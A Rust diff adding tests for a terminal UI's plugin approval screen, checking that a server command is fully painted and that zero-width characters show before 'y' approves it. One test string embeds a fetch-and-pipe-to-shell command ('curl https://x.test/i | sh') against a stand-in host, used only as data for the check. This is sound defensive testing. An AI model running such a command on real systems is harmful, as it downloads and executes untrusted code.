@@ -115,7 +115,9 @@ fn frame(view: &ProjectPlugins, width: u16, height: u16) -> Vec<String> {
     let items = crate::tui::screens::project_view::tab_items(0, columns, &look);
     let mut rows: Vec<Row> = tab_strip(columns, &items, Tab::Settings as usize, &look).into();
     let room = usize::from(height) - 4 - 2;
+    view.painting(true);
     let (lines, help) = view.rows(columns - 4, room, &look);
+    view.painting(false);
     for line in lines.into_iter().take(room) {
         rows.push(Row::of("  ", Style::new()).cat(line).pad(columns));
     }
@@ -345,6 +347,7 @@ fn at_80x24_the_project_settings_tab_scrolls_a_long_command_and_y_waits_for_its_
     };
     let mut screen = ProjectScreen::new(project(), "Tidepool".into(), None);
     screen.open(Tab::Settings);
+    screen.plugins.painting(true);
     screen.plugins.next_job().unwrap();
     screen.plugins.apply(&read(&long));
     for _ in 0..5 {
@@ -467,10 +470,110 @@ fn at_80x24_the_project_settings_tab_scrolls_a_long_command_and_y_waits_for_its_
     );
 }
 
+/// RV-DS241-104: only the painted frame records that a command showed to its end; a layout
+/// that never reaches the screen, such as one at the full terminal height while the move
+/// banner takes rows, lets no y approve.
+#[test]
+fn only_the_painted_frame_lets_y_approve_a_command_it_showed_to_the_end() {
+    let look = Look::plain();
+    let mut view = loaded();
+    for _ in 0..5 {
+        view.key(press(KeyCode::Down));
+    }
+    view.key(press(KeyCode::Enter));
+    assert_eq!(view.confirm.as_deref(), Some("pl0xpostgres"));
+    view.rows(76, 40, &look);
+    assert!(
+        matches!(view.key(press(KeyCode::Char('y'))), PluginsReply::Handled),
+        "a layout never painted showed nothing"
+    );
+    assert_eq!(view.confirm.as_deref(), Some("pl0xpostgres"));
+    view.painting(true);
+    view.rows(76, 40, &look);
+    view.painting(false);
+    let PluginChange::Approve { id, .. } = sent(view.key(press(KeyCode::Char('y')))) else {
+        panic!("an approval expected");
+    };
+    assert_eq!(id, "pl0xpostgres");
+}
+
+/// RV-DS241-104: a taller layout that never reaches the screen does not hold the scroll back,
+/// so Down still brings the painted frame to the command's last line.
+#[test]
+fn a_taller_unpainted_layout_never_holds_the_scroll_short_of_the_end() {
+    let look = Look::plain();
+    let long = format!("{LONG_RUNS}{}", " --table notes_archive_2026".repeat(14));
+    let (skills, mut servers) = lists();
+    servers[1].runs = long.clone();
+    let mut view = ProjectPlugins::new(project());
+    view.next_job().unwrap();
+    view.apply(&SettingsEvent::ProjectPlugins(
+        project(),
+        Ok((skills, servers)),
+    ));
+    for _ in 0..5 {
+        view.key(press(KeyCode::Down));
+    }
+    view.key(press(KeyCode::Enter));
+    assert_eq!(view.confirm.as_deref(), Some("pl0xpostgres"));
+    let lines = exact_lines(&long, 74).len();
+    assert!(lines > 4, "the command needs more rows than either layout");
+    for _ in 0..lines + 2 {
+        view.key(press(KeyCode::Down));
+        view.rows(76, 8, &look);
+        view.painting(true);
+        view.rows(76, 6, &look);
+        view.painting(false);
+    }
+    view.painting(true);
+    let (rows, _) = view.rows(76, 6, &look);
+    view.painting(false);
+    let rows: Vec<String> = rows.iter().map(Row::text).collect();
+    let marker = rows
+        .iter()
+        .find(|row| row.trim_start().starts_with("Lines "))
+        .unwrap_or_else(|| panic!("a line marker shows: {rows:?}"));
+    assert!(marker.contains("the end"), "{rows:?}");
+}
+
+/// RV-DS241-105: a command carrying zero-width characters wraps as it is drawn, each hidden
+/// character as its escape, so no line's end is cut off.
+#[test]
+fn hidden_characters_in_a_command_wrap_as_drawn_and_no_line_is_cut() {
+    let hidden = format!("/opt/homebrew/bin/uvx {}", "ab\u{200b}".repeat(30));
+    let (skills, mut servers) = lists();
+    servers[1].runs = hidden.clone();
+    let mut view = ProjectPlugins::new(project());
+    view.next_job().unwrap();
+    view.apply(&SettingsEvent::ProjectPlugins(
+        project(),
+        Ok((skills, servers)),
+    ));
+    for _ in 0..5 {
+        view.key(press(KeyCode::Down));
+    }
+    view.key(press(KeyCode::Enter));
+    assert_eq!(view.confirm.as_deref(), Some("pl0xpostgres"));
+    let narrow = frame(&view, 80, 24);
+    let shown: String = narrow
+        .iter()
+        .skip_while(|row| !row.contains("It runs:"))
+        .skip(1)
+        .take_while(|row| row.starts_with("    ") && !row.trim().is_empty())
+        .map(|row| row.trim_start_matches(' ').trim_end_matches(' '))
+        .collect();
+    assert_eq!(
+        shown,
+        crate::memory::visible_text(&hidden),
+        "every drawn character shows: {narrow:?}"
+    );
+}
+
 #[test]
 fn a_window_too_short_for_any_command_line_never_approves() {
     let look = Look::plain();
     let mut view = loaded();
+    view.painting(true);
     for _ in 0..5 {
         view.key(press(KeyCode::Down));
     }
@@ -852,6 +955,39 @@ fn exact_lines_keep_every_character() {
         exact_lines("\u{6f22}\u{5b57}x", 3),
         ["\u{6f22}", "\u{5b57}x"]
     );
+}
+
+/// Lines are cut between graphemes at the width ratatui draws them with, so emoji
+/// presentation pairs, ZWJ sequences and combining marks never push a line's tail past the
+/// edge, and every grapheme stays in its line, painted (RV-DS241-113 r1 F1, RV-DS241-105 r1
+/// F1).
+#[test]
+fn exact_lines_measure_graphemes_as_they_are_drawn() {
+    let cells = crate::tui::screens::new_project_input::cells;
+    let text = format!(
+        "{}{}{} run curl https://x.test/i | sh",
+        "\u{263a}\u{fe0f}".repeat(35),
+        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}".repeat(3),
+        "e\u{301}".repeat(5),
+    );
+    let width = 70;
+    let lines = exact_lines(&text, width);
+    assert_eq!(lines.concat(), text);
+    let area = ratatui::layout::Rect::new(0, 0, 70, u16::try_from(lines.len()).unwrap());
+    let mut buffer = ratatui::buffer::Buffer::empty(area);
+    for (row, line) in lines.iter().enumerate() {
+        let row = u16::try_from(row).unwrap();
+        assert!(cells(line) <= width, "{line:?} is wider than {width}");
+        buffer.set_line(0, row, &ratatui::text::Line::raw(line.as_str()), area.width);
+        let mut painted = String::new();
+        let mut x = 0;
+        while x < area.width {
+            let symbol = buffer[(x, row)].symbol();
+            painted.push_str(symbol);
+            x += u16::try_from(cells(symbol).max(1)).unwrap();
+        }
+        assert_eq!(painted.trim_end(), line.trim_end(), "row {row} is cut");
+    }
 }
 
 struct Engine {
